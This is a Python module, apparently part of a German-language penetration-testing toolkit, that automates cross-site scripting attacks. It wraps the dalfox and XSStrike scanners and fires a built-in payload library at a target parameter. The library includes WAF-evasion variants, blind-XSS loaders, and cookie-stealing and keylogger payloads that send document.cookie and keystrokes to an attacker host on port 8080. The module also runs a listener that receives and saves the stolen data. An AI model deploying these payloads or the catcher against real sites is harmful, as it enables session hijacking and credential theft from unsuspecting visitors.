"""
PenKit XSS Engine — automatisierte XSS-Erkennung und Ausnutzung.

Tools:
  1. dalfox   — bester XSS-Scanner (reflektiert + DOM + Blind), WAF-Bypass
  2. XSStrike — smart context-aware XSS (Python, no install nötig)
  3. Manual   — eigene Payloads testen (Burp-Export kompatibel)
  4. Payload  — fertige XSS-Payloads für alle Kontexte generieren

  apt install dalfox
  pip3 install xsstrike
"""

from __future__ import annotations
import asyncio
import shutil
import urllib.parse
from typing import AsyncGenerator

from core.runner import CommandRunner
from core.output_dir import get as out_dir


# ── XSS Payload-Bibliothek ────────────────────────────────────────────────────

PAYLOADS_BY_CONTEXT: dict[str, list[str]] = {
    "html_basic": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe srcdoc=\"<script>alert(1)</script>\">",
    ],
    "attribute": [
        "\" onmouseover=\"alert(1)\" x=\"",
        "' onmouseover='alert(1)' x='",
        "\" autofocus onfocus=\"alert(1)\" x=\"",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ],
    "js_string": [
        "';alert(1)//",
        "\";alert(1)//",
        "\\';alert(1)//",
        "\\x27;alert(1)//",
        "\\u0027;alert(1)//",
    ],
    "waf_bypass": [
        "<ScRiPt>alert(1)</ScRiPt>",
        "<img src=x onerror=\\u0061lert(1)>",
        "<svg/onload=&#x61;lert(1)>",
        "<<script>alert(1)//<</script>",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<img src=1 href=1 onerror=\"javascript:eval('a\\x6cert(1)')\">",
        "';alert(String.fromCharCode(88,83,83))//",
    ],
    "dom_xss": [
        "#<img src=x onerror=alert(1)>",
        "#\"><img src=x onerror=alert(1)>",
        "javascript:alert(document.domain)",
    ],
    "blind_xss": [
        "<script src=//xsshunter.com/></script>",
        "\"><script src=//xsshunter.com/></script>",
        "';var s=document.createElement('script');s.src='//xsshunter.com/';document.body.appendChild(s);//",
    ],
    "cookie_steal": [
        "<script>document.location='http://<kali>:8080/?c='+document.cookie</script>",
        "<img src=x onerror=\"fetch('http://<kali>:8080/?c='+btoa(document.cookie))\">",
        "<svg onload=\"new Image().src='http://<kali>:8080/?c='+document.cookie\">",
    ],
    "keylogger": [
        (
            "<script>document.addEventListener('keydown',function(e){"
            "new Image().src='http://<kali>:8080/?k='+e.key});</script>"
        ),
    ],
}


# ── dalfox Scanner ────────────────────────────────────────────────────────────

async def dalfox_scan(
    url: str,
    param: str = "",
    cookie: str = "",
    headers: dict | None = None,
    blind: str = "",
    waf_bypass: bool = True,
    output_format: str = "plain",
) -> AsyncGenerator[str, None]:
    """
    dalfox XSS-Scanner — reflektiert, DOM, Blind, WAF-Bypass.
    """
    if not shutil.which("dalfox"):
        yield "\033[31m[!] dalfox nicht gefunden. Install: apt install dalfox\033[0m"
        return

    runner = CommandRunner()
    out_file = out_dir("network") / f"dalfox_{url.replace('https://','').replace('http://','').replace('/','_')[:40]}.txt"

    cmd = ["dalfox", "url", url]

    if param:
        cmd += ["-p", param]
    if cookie:
        cmd += ["--cookie", cookie]
    if blind:
        cmd += ["--blind", blind]
    if waf_bypass:
        cmd += ["--waf-evasion"]
    if headers:
        for k, v in headers.items():
            cmd += ["-H", f"{k}: {v}"]

    cmd += ["--output", str(out_file), "--silence"]

    yield f"\033[1;36m[*] dalfox XSS-Scan: {url}\033[0m"
    if waf_bypass:
        yield "    WAF-Evasion: aktiviert"
    if blind:
        yield f"    Blind XSS Callback: {blind}"
    yield ""

    found_xss = []
    async for line in runner.run(cmd):
        if "[V]" in line or "VULN" in line.upper() or "XSS" in line.upper():
            found_xss.append(line)
            yield f"\033[1;32m  ✓ {line}\033[0m"
        elif "[I]" in line:
            yield f"\033[33m  ~ {line}\033[0m"
        elif "[E]" in line:
            yield f"\033[31m  ✗ {line}\033[0m"
        else:
            yield f"  {line}"

    if found_xss:
        yield f"\n\033[1;32m[✓] {len(found_xss)} XSS-Schwachstellen gefunden!\033[0m"
        yield f"\033[32m[✓] Report: {out_file}\033[0m"
    else:
        yield "\n\033[33m[~] Keine XSS gefunden (oder WAF blockiert).\033[0m"
        yield "    Tipps: --waf-evasion, manuell testen, andere Parameter prüfen"


# ── XSStrike ──────────────────────────────────────────────────────────────────

async def xsstrike_scan(
    url: str,
    data: str = "",
    cookie: str = "",
    crawl: bool = False,
) -> AsyncGenerator[str, None]:
    """
    XSStrike — intelligenter Context-Aware XSS-Scanner in Python.
    """
    xsstrike = shutil.which("xsstrike") or shutil.which("xss-strike")
    if not xsstrike:
        # Prüfe pip-Installation
        import sys
        xsstrike_mod = None
        for path in ["/usr/lib/python3/dist-packages/xsstrike",
                     f"{sys.prefix}/lib/python3/dist-packages/xsstrike"]:
            import os
            if os.path.exists(path):
                xsstrike_mod = path
                break

        if not xsstrike_mod:
            yield "\033[31m[!] XSStrike nicht gefunden.\033[0m"
            yield "    Install: pip3 install xsstrike --break-system-packages"
            yield "    oder: git clone https://github.com/s0md3v/XSStrike && cd XSStrike && python3 xsstrike.py"
            return

    runner = CommandRunner()
    cmd_base = ["python3", "-m", "xsstrike"] if not xsstrike else [xsstrike]
    cmd = cmd_base + ["--url", url]

    if data:
        cmd += ["--data", data]
    if cookie:
        cmd += ["--cookie", cookie]
    if crawl:
        cmd += ["--crawl"]

    yield f"\033[1;36m[*] XSStrike Context-Aware Scan: {url}\033[0m\n"

    async for line in runner.run(cmd):
        if any(k in line for k in ("XSS", "Reflected", "Vulnerable", "xss")):
            yield f"\033[1;32m  ✓ {line}\033[0m"
        elif "Testing" in line or "testing" in line:
            yield f"\033[36m  > {line}\033[0m"
        else:
            yield f"  {line}"


# ── Manueller Payload-Tester ──────────────────────────────────────────────────

async def test_payloads(
    url: str,
    param: str,
    context: str = "html_basic",
    custom_payloads: list[str] | None = None,
) -> AsyncGenerator[str, None]:
    """Testet Payload-Bibliothek gegen URL+Parameter."""
    import urllib.request
    import urllib.error

    payloads = custom_payloads or PAYLOADS_BY_CONTEXT.get(context, PAYLOADS_BY_CONTEXT["html_basic"])

    yield f"\033[1;36m[*] Teste {len(payloads)} Payloads gegen {url} (param: {param})\033[0m\n"

    hits = 0
    for i, payload in enumerate(payloads, 1):
        encoded = urllib.parse.quote(payload)
        sep = "&" if "?" in url else "?"
        test_url = f"{url}{sep}{param}={encoded}"

        try:
            req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read().decode(errors="ignore")
                # Prüf ob Payload im Response (nicht encodiert)
                if payload.lower() in body.lower() or "<script>" in body.lower():
                    hits += 1
                    yield f"\033[1;32m  [{i:>2}] ✓ REFLEKTIERT: {payload[:60]}\033[0m"
                    yield f"\033[32m       URL: {test_url[:80]}\033[0m"
                else:
                    yield f"\033[90m  [{i:>2}] ✗ {payload[:60]}\033[0m"
        except Exception as e:
            yield f"\033[31m  [{i:>2}] ERR: {e}\033[0m"

        await asyncio.sleep(0.1)

    yield f"\n\033[{'32' if hits > 0 else '33'}m[{'✓' if hits > 0 else '~'}] {hits}/{len(payloads)} Payloads reflektiert.\033[0m"


# ── Payload-Generator ─────────────────────────────────────────────────────────

async def show_payloads(
    context: str = "all",
    kali_ip: str = "10.10.10.1",
) -> AsyncGenerator[str, None]:
    """Zeigt alle Payloads für gewählten Kontext."""
    yield "\033[1;36m[*] XSS Payload-Bibliothek:\033[0m\n"

    contexts = [context] if context != "all" else list(PAYLOADS_BY_CONTEXT.keys())

    for ctx in contexts:
        payloads = PAYLOADS_BY_CONTEXT.get(ctx, [])
        yield f"\033[33m[{ctx.upper().replace('_', ' ')}]\033[0m"
        for p in payloads:
            display = p.replace("<kali>", kali_ip)
            yield f"\033[36m  {display}\033[0m"
        yield ""


# ── Cookie-Catcher starten ────────────────────────────────────────────────────

async def start_cookie_catcher(port: int = 8080) -> AsyncGenerator[str, None]:
    """
    Startet simplen HTTP-Server der XSS-Callbacks (Cookies/Keys) empfängt.
    Zeigt empfangene Daten live an.
    """
    import http.server
    import threading
    import json
    from datetime import datetime

    caught: list[dict] = []
    out_file = out_dir("network") / "xss_caught.json"

    class CatchHandler(http.server.BaseHTTPRequestHandler):
        def log_message(self, fmt, *args): pass

        def do_GET(self):
            parsed = urllib.parse.urlparse(self.path)
            params = urllib.parse.parse_qs(parsed.query)
            entry = {
                "time": datetime.now().isoformat(),
                "ip": self.client_address[0],
                "params": params,
                "ua": self.headers.get("User-Agent", ""),
            }
            caught.append(entry)
            # In Datei speichern
            try:
                out_file.write_text(json.dumps(caught, indent=2))
            except Exception:
                pass

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")

    yield f"\033[1;36m[*] XSS Cookie-Catcher auf Port {port}...\033[0m"
    yield f"\033[36m    Payloads mit: http://<kali_ip>:{port}/?c=...\033[0m"
    yield f"\033[36m    Gespeichert in: {out_file}\033[0m"
    yield "    CTRL+C zum Beenden\n"

    server = http.server.HTTPServer(("0.0.0.0", port), CatchHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    last_count = 0
    try:
        while True:
            if len(caught) > last_count:
                for entry in caught[last_count:]:
                    yield f"\033[1;32m[!] CALLBACK von {entry['ip']} um {entry['time']}\033[0m"
                    for k, v in entry["params"].items():
                        yield f"    {k}: \033[33m{v[0][:200]}\033[0m"
                    yield ""
                last_count = len(caught)
            await asyncio.sleep(0.5)
    except (KeyboardInterrupt, asyncio.CancelledError):
        server.shutdown()
        yield f"\n\033[32m[✓] {len(caught)} Callbacks empfangen. Gespeichert: {out_file}\033[0m"
